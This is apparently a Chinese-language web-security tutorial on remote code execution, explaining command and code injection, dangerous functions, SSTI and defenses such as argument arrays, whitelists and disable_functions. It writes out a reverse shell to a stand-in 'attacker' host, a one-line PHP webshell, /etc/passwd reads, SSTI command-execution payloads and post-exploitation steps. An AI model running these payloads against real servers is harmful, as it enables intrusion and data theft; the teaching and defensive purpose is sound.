---
title: RCE 远程代码执行：在服务器上跑你的命令
description: 讲清 RCE 的原理与危害，分析 eval/exec/system/passthru 等危险函数，覆盖命令注入发现与利用，并给出禁用函数、输入白名单、URL 过滤等防御。
category: security
subcategory: pentest
tags: ['RCE', '命令注入', '远程代码执行', 'Web安全']
pubDate: 2026-07-18
order: 8
---

**RCE（远程代码/命令执行）** 是 Web 漏洞里的"天花板"级危害：攻击者能直接在目标服务器上执行系统命令或脚本代码，基本等于拿下服务器。它和 SQLi、XSS 一样属于"把数据当代码执行"，只不过这次执行的是**系统命令 / 服务端代码**。

> 以下仅在授权靶场（如 DVWA、命令注入练习平台）练习；对他人服务器执行命令属严重违法。

## 原理：两种"代码执行"

RCE 分两类：

1. **命令注入（Command Injection）**：把数据当**系统命令**执行。比如后端用 `system("ping ".$ip)`，你输入 `8.8.8.8; cat /etc/passwd`，分号后的命令也跑了。
2. **代码注入（Code Injection）**：把数据当**编程语言代码**执行。比如 `eval($_GET['code'])`，你传 `phpinfo();` 就执行了。

共同点：用户输入被当成了"可执行的指令"。

## 危险函数清单（审计必查）

**PHP 命令执行**：`system`、`exec`、`shell_exec`、`passthru`、`popen`、`proc_open`、``(反引号)`
**PHP 代码执行**：`eval`、`assert`、`preg_replace(/e 修饰符)`、`create_function`
**Python**：`os.system`、`subprocess.os.system`、`os.popen`、`eval`、`exec`
**Java**：`Runtime.getRuntime().exec()`、`ProcessBuilder`、`Groovy` 动态执行
**Node**：`eval`、`child_process.exec`（注意 `exec` 走 shell，有注入风险；`execFile` 相对安全）

审计时，把这些函数当"红灯"，重点看它们的参数是否含用户输入。

## 命令注入：拼接的灾难

```php
$ip = $_GET['ip'];
$result = shell_exec("ping -c 1 " . $ip);
```

输入 `ip=8.8.8.8 && id`，拼成：

```bash
ping -c 1 8.8.8.8 && id
```

`&&` 让 `id` 也执行，服务器用户和权限暴露。常见命令连接符：

- `;`：顺序执行前后命令；
- `&&`：前成功才执行后；
- `||`：前失败才执行后；
- `|`：管道，把前输出给后；
- 换行符 `%0a`、`&`、`$()`、反引号 也能拼接。

## 发现与利用

1. 找"会触发系统行为"的功能：ping 工具、网络检测、图片处理（调用 imagemagick）、压缩导出、邮件发送；
2. 输入 `; id`、`| whoami`、`$(id)` 看是否有命令回显；
3. 盲命令注入：若没回显，用 `sleep 5` 看响应是否变慢（时间盲注思路）；
4. 反弹 shell：拿到命令执行后，用 `bash -i >& /dev/tcp/attacker/port 0>&1` 反向连接，拿到交互式 shell；
5. 读文件、写 webshell、提权，逐步扩大控制。

## 代码注入：eval 的诱惑

```php
// 危险示例
eval("echo " . $_GET['name'] . ";");
// 输入 name=phpinfo()  → 执行 phpinfo()
```

任何 `eval` 用户输入都是高危。更隐蔽的如 `assert($_GET['x'])`、`preg_replace('/xxx/e', $_GET['x'], ...)`（e 修饰符已废弃但老代码有）。

## 危害总结

- 读/改/删服务器任意文件；
- 安装后门、挖矿木马；
- 内网横向移动；
- 把服务器当肉鸡发起攻击；
- 数据全库拖走。

一旦 RCE，基本宣告"服务器已失守"。

## 防御：别让数据变指令

**1. 避免使用危险函数**

能不用 `eval`/`system` 就别用。需要执行命令时，用"参数数组"形式（不拼 shell）：

```php
// 危险：拼字符串走 shell
exec("ping -c 1 " . $ip);

// 相对安全：参数分离，不经过 shell 解析
exec("ping", ["-c", "1", $ip]);  // 实际用 proc_open / escapeshellarg
```

PHP 用 `escapeshellarg()` / `escapeshellcmd()` 转义参数；Node 用 `execFile` 而非 `exec`。

**2. 输入白名单**

能确定的输入就严格限定：IP 就用正则校验、`intval` 强转数字、文件名限定字符集。

```php
if (!filter_var($ip, FILTER_VALIDATE_IP)) die('非法 IP');
```

**3. 禁用危险函数（PHP）**

`php.ini` 里：

```ini
disable_functions = eval,exec,system,shell_exec,passthru,proc_open,popen
```

按需关闭，减少攻击面（注意可能影响正常功能）。

**4. 最小权限运行**

Web 服务用低权限用户（如 `www-data`）运行，即使被 RCE 也拿不到 root，限制破坏范围。

**5. 沙箱 / 隔离**

执行不可信代码（如在线判题、插件）放进容器/沙箱，限制系统调用和网络。

**6. WAF / 命令黑名单**

拦 `;`、`|`、`cat`、`/etc/passwd` 等，但黑名单易被绕过，只能缓解。


## 更多实战案例：命令与代码执行

**命令注入**：`system("ping -c 1 " . $_GET['ip'])`，攻击者传 `ip=127.0.0.1;cat /etc/passwd`，分号后面命令被执行。还能用 `|`、`&&`、`$(whoami)`、`\`\` 等连接。

**代码执行**：`eval($_GET['c'])` 直接把用户输入当 PHP 跑，等于给攻击者开了后门；`assert()`、`preg_replace('/e'...)`（已移除）、`create_function()` 也都曾被用作代码执行点。

**反序列化 RCE**：见反序列化篇，某些语言的 `unserialize` 会触发魔术方法执行系统命令。

**模板注入（SSTI）**：服务端模板（如 Jinja2、Twig、Freemarker）把用户输入当模板语法解析，`{{7*7}}` 返回 49 就说明存在，进一步可 `{{config}}` 读配置、`{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}` 执行命令。

## 常见坑

1. **只过滤 `;` 和 `&`**：攻击者换 `|`、`$( )`、换行符 `\n` 照样执行。
2. **用黑名单拦 `system`**：拦了 system 还有 exec、passthru、shell_exec、popen，拦不完。
3. **以为 SSTI 只是显示 bug**：它能读配置甚至 RCE，危害同 RCE。
4. **参数化只防 SQL 不防命令**：命令执行是另一回事，要单独处理。

## 进阶：修复

命令执行：绝不用 `eval`；调用系统命令优先用"参数数组"形式（如 `proc_open` 数组参数）避免 shell 解析；必须拼命令时用 `escapeshellarg()`。代码执行：删掉一切 `eval`/`assert` 动态执行。SSTI：模板里不要把用户输入当模板字符串渲染，用沙箱或静态模板。

## 小测验

- 问题1：`{{7*7}}` 返回 49 说明什么？答案：存在服务端模板注入 SSTI。
- 问题2：修命令注入优先？答案：避免 shell 解析，用参数数组或 escapeshellarg。
- 问题3：eval 用户输入最大风险？答案：等于把代码执行权限交给攻击者（RCE）。



## 更多实战案例：命令注入在真实功能里

命令注入常藏在"调用系统命令"的功能：网站给服务器发 ping 测连通性（`ping -c 1 $ip`）、提供 traceroute、提供把文件转 PDF/图片（调用 `convert`、`wkhtmltopdf`）、提供域名解析（调用 `dig`/`nslookup`）。这些功能后端用字符串拼接把用户输入塞进 shell 命令，攻击者在输入里加 `;`、`|`、`&&`、`$(命令)`、反引号就能把额外命令拼进去执行。测试时把正常参数后接 `;id` 看返回里有没有 `uid=`，有就证明注入成功。

## 更多实战案例：代码执行与反序列化联动

`eval`、动态 `include`、可变函数（`$func($_GET['x'])`）是代码执行点。反序列化漏洞（见反序列化篇）常常就是 RCE 的入口：构造一个对象，其销毁时调用的方法里正好有命令执行，于是反序列化即 RCE。模板注入（SSTI）也是 RCE 通道：服务端模板引擎把用户输入当模板语法解析，通过对象方法链调用系统命令。可见 RCE 不是孤立的一类，而是多条漏洞链的最终目标——能执行命令，基本就拿下服务器。

## 更多实战案例：拿到命令执行之后

一旦确认 RCE，攻击者会确认权限（`whoami`/`id`）、看系统信息（`uname -a`）、读配置文件拿数据库密码、看内网情况（`ifconfig`/`ip`）、尝试提权（找 SUID 文件、内核漏洞、计划任务）。对防御方而言，这意味着 RCE 是"灾难级"风险，必须从源头（不把输入当代码）堵死，并配合最小权限、禁用危险函数、WAF 规则做纵深防御。

## 常见坑（补充）

1. **只过滤常见连接符**：`;` `&` `|` 被拦，还有换行、`$()`、反引号、`<` 重定向等。
2. **用黑名单拦函数名**：`system` 被拦还有 `exec`、`passthru`、`popen`、`proc_open`。
3. **以为在容器里就安全**：容器逃逸、挂载敏感目录仍可扩大影响。
4. **忽略 Windows 与 Linux 差异**：连接符和命令不同，测试要分平台。

## 进阶（补充）：修复清单

绝不用 `eval` 动态执行用户输入；调用系统命令优先用"参数数组"形式避免 shell 解析（如 Python 的 `subprocess.run([cmd, arg])` 而非 `shell=True`）；必须拼命令时用 `escapeshellarg`（PHP）等做参数转义；在 php.ini 禁用 `exec`/`system` 等危险函数；用 WAF 规则拦常见 payload 作为缓解。

## 小测验（补充）

- 问题1：ping 功能怎么测命令注入？答案：参数后加 `;id`，看返回有无 uid=。
- 问题2：为什么 RCE 是多条漏洞链终点？答案：注入、反序列化、SSTI 最终都可能执行命令。
- 问题3：subprocess 怎么安全调命令？答案：用参数数组、shell=False，避免 shell 解析。



## 更多实战案例：从命令注入到稳定 shell

确认命令注入后，攻击者常想拿到交互 shell。简单做法：用 `;bash -i >& /dev/tcp/attacker/4444 0>&1` 反弹 shell 到攻击者监听的端口（需目标出网）。若不支持交互，可用写 webshell：`;echo '<?php system($_GET[c]);?>' > /var/www/shell.php`，再访问该文件执行命令。Windows 下用 `certutil` 下载木马、`powershell` 拉取并执行。这些后续动作都建立在"能执行命令"之上，所以 RCE 是渗透的"决胜点"。

## 更多实战案例：SSTI 各引擎利用差异

不同模板引擎语法不同：Jinja2（Python/Flask）用 `{{7*7}}` 测、用 `{{config}}` 读配置、`{{cycler.__init__.__globals__.os.popen('id').read()}}` 执行；Twig（PHP）用 `{{7*7}}`、读变量、用 `_self.env.registerUndefinedFilterCallback` 等技巧执行；Freemarker（Java）用 `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`。识别引擎靠报错信息或语法探测，再针对性利用。

## 常见坑（再补充）

1. **反弹 shell 不出网**：目标禁出网或防火墙拦截，需换通道（如 DNS 隧道、WebSocket）。
2. **以为删了 system 就安全**：还有 exec、passthru、popen、proc_open、反引号。
3. **Windows/Linux 命令混用**：连接符和命令不同，测试要分平台。
4. **忽略计划任务持久化**：拿到权限后应关注如何维持，但防御要断源头。

## 进阶（再补充）：防御纵深

除了不把输入当代码，还应：在 php.ini 禁用危险函数；用 WAF 拦常见 payload 作缓解；容器/服务器以最小权限运行，即使被 RCE 也拿不到高权限；关键命令执行操作加审计与告警；对调用系统命令的功能做严格参数白名单。

## 小测验（再补充）

- 问题1：反弹 shell 不出网怎么办？答案：换 DNS 隧道、WebSocket 等出网通道。
- 问题2：SSTI 利用为什么要先识别引擎？答案：各引擎语法不同，需针对性构造 payload。
- 问题3：除代码层，还有什么防御？答案：最小权限运行、禁用危险函数、WAF、审计告警。


## 这一篇你该记住的

RCE 是"把数据当系统命令/代码执行"，分命令注入（危险函数 system/exec 拼用户输入）和代码注入（eval/assert）。发现靠找"触发系统行为"的功能、试连接符 `; && |`、盲注用 `sleep`。危害是服务器失守。防御：避免危险函数、用参数数组+转义、输入白名单、disable_functions、低权限运行、沙箱隔离。

RCE 直接拿服务器。下一篇 **文件上传** 是另一条拿权限的捷径：传一个能执行命令的脚本（webshell），再访问它，等于拥有 RCE。
